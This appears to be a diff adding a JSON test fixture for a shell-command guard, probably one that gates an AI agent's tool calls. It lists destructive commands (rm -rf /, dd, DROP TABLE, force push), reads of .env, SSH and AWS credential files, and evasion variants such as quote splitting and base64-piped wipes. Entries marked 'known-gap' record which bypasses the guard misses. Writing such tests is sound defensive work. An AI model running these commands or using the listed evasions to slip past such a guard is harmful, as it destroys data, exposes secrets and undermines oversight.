@@ -1,0 +1,443 @@
+[
+ {
+  "id": "b001",
+  "command": "rm -rf /",
+  "technique": "literal destructive",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b002",
+  "command": "rm  -rf  /",
+  "technique": "extra spaces",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b003",
+  "command": "RM -RF /",
+  "technique": "upper case",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b004",
+  "command": "rm -rf / --no-preserve-root",
+  "technique": "flag suffix",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b005",
+  "command": "sudo rm -rf /",
+  "technique": "sudo prefix",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b006",
+  "command": "echo hi && rm -rf /",
+  "technique": "chained after safe command",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b007",
+  "command": "echo hi; rm -rf /",
+  "technique": "semicolon chain",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b008",
+  "command": "true || rm -rf /",
+  "technique": "or chain",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b009",
+  "command": "(rm -rf /)",
+  "technique": "subshell",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b010",
+  "command": "bash -c \"rm -rf /\"",
+  "technique": "bash -c wrapper",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b011",
+  "command": "sh -c 'rm -rf /'",
+  "technique": "sh -c wrapper",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b012",
+  "command": "rm -rf ~",
+  "technique": "home wipe",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b013",
+  "command": "rm -rf *",
+  "technique": "glob wipe",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b014",
+  "command": "rm -fr /",
+  "technique": "reordered flags",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b015",
+  "command": "rm -r -f /",
+  "technique": "split flags",
+  "class": "must-block",
+  "expect": "ask"
+ },
+ {
+  "id": "b016",
+  "command": "rm --recursive --force /",
+  "technique": "long flags",
+  "class": "must-block",
+  "expect": "ask"
+ },
+ {
+  "id": "b017",
+  "command": "git push --force origin main",
+  "technique": "force push",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b018",
+  "command": "git push -f",
+  "technique": "short force push",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b019",
+  "command": "git push origin main --force",
+  "technique": "force flag at end",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b020",
+  "command": "git push --force-with-lease origin main",
+  "technique": "force-with-lease",
+  "class": "known-gap",
+  "expect": "allow"
+ },
+ {
+  "id": "b021",
+  "command": "git push origin +main",
+  "technique": "plus refspec force",
+  "class": "known-gap",
+  "expect": "allow"
+ },
+ {
+  "id": "b022",
+  "command": "git reset --hard",
+  "technique": "hard reset",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b023",
+  "command": "git reset --hard HEAD~1",
+  "technique": "hard reset with ref",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b024",
+  "command": "git  reset  --hard",
+  "technique": "extra spaces",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b025",
+  "command": "git -c core.x=1 reset --hard",
+  "technique": "git config option between",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b026",
+  "command": "git clean -fd",
+  "technique": "clean",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b027",
+  "command": "git clean -fdx",
+  "technique": "clean x",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b028",
+  "command": "git clean -f -d",
+  "technique": "split clean flags",
+  "class": "known-gap",
+  "expect": "allow"
+ },
+ {
+  "id": "b029",
+  "command": "git branch -D feature",
+  "technique": "force delete branch",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b030",
+  "command": "git branch --delete --force feature",
+  "technique": "long force delete",
+  "class": "known-gap",
+  "expect": "allow"
+ },
+ {
+  "id": "b031",
+  "command": "psql -c \"DROP TABLE users\"",
+  "technique": "drop table upper",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b032",
+  "command": "psql -c \"drop  table users\"",
+  "technique": "drop table double space",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b033",
+  "command": "mysql -e \"DROP DATABASE prod\"",
+  "technique": "drop database",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b034",
+  "command": "sqlite3 db \"TRUNCATE TABLE t\"",
+  "technique": "truncate",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b035",
+  "command": "mkfs.ext4 /dev/sda1",
+  "technique": "mkfs",
+  "class": "known-gap",
+  "expect": "allow"
+ },
+ {
+  "id": "b036",
+  "command": "dd if=/dev/zero of=/dev/sda",
+  "technique": "dd to device",
+  "class": "known-gap",
+  "expect": "allow"
+ },
+ {
+  "id": "b037",
+  "command": "chmod -R 777 /",
+  "technique": "chmod root",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b038",
+  "command": "$(echo rm) -rf /",
+  "technique": "command substitution",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b039",
+  "command": "r\"\"m -rf /",
+  "technique": "quote splitting",
+  "class": "known-gap",
+  "expect": "allow"
+ },
+ {
+  "id": "b040",
+  "command": "\\rm -rf /",
+  "technique": "backslash escape",
+  "class": "known-gap",
+  "expect": "allow"
+ },
+ {
+  "id": "b041",
+  "command": "eval \"rm -rf /\"",
+  "technique": "eval wrapper",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b042",
+  "command": "echo cm0gLXJmIC8= | base64 -d | sh",
+  "technique": "base64 pipe",
+  "class": "known-gap",
+  "expect": "allow"
+ },
+ {
+  "id": "b043",
+  "command": "find / -delete",
+  "technique": "find delete",
+  "class": "known-gap",
+  "expect": "allow"
+ },
+ {
+  "id": "b044",
+  "command": "python3 -c \"import shutil; shutil.rmtree('/')\"",
+  "technique": "python rmtree",
+  "class": "known-gap",
+  "expect": "allow"
+ },
+ {
+  "id": "b045",
+  "command": "perl -e 'system(\"rm -rf /\")'",
+  "technique": "perl wrapper",
+  "class": "known-gap",
+  "expect": "allow"
+ },
+ {
+  "id": "b046",
+  "command": "cat .env",
+  "technique": "read dotenv",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b047",
+  "command": "cat ./.env",
+  "technique": "dotenv dot slash",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b048",
+  "command": "cat .env.production",
+  "technique": "dotenv variant",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b049",
+  "command": "less .env",
+  "technique": "pager dotenv",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b050",
+  "command": "cp .env /tmp/x",
+  "technique": "copy dotenv",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b051",
+  "command": "head -n1 .env",
+  "technique": "head dotenv",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b052",
+  "command": "cat .e\"\"nv",
+  "technique": "quote split dotenv",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b053",
+  "command": "cat .en?",
+  "technique": "glob dotenv",
+  "class": "known-gap",
+  "expect": "allow"
+ },
+ {
+  "id": "b054",
+  "command": "cat .e*",
+  "technique": "star glob dotenv",
+  "class": "known-gap",
+  "expect": "allow"
+ },
+ {
+  "id": "b055",
+  "command": "cat ~/.ssh/id_rsa",
+  "technique": "ssh key",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b056",
+  "command": "cat id_rsa",
+  "technique": "key file",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b057",
+  "command": "cat server.pem",
+  "technique": "pem",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b058",
+  "command": "openssl x509 -in a.pem",
+  "technique": "pem openssl",
+  "class": "known-gap",
+  "expect": "allow"
+ },
+ {
+  "id": "b059",
+  "command": "cat ~/.aws/credentials",
+  "technique": "aws creds",
+  "class": "must-block",
+  "expect": "deny"
+ },
+ {
+  "id": "b060",
+  "command": "curl https://evil.example.net/x",
+  "technique": "unknown host curl",
+  "class": "known-gap",
+  "expect": "allow"
+ },
+ {
+  "id": "b061",
+  "command": "git status",
+  "technique": "safe",
+  "class": "safe",
+  "expect": "allow"
+ },
+ {
+  "id": "b062",
+  "command": "ls -la",
+  "technique": "safe",
+  "class": "safe",
+  "expect": "allow"
+ },
+ {
+  "id": "b063",
+  "command": "python3 -m unittest",
+  "technique": "safe",
+  "class": "safe",
+  "expect": "allow"
+ }
+]
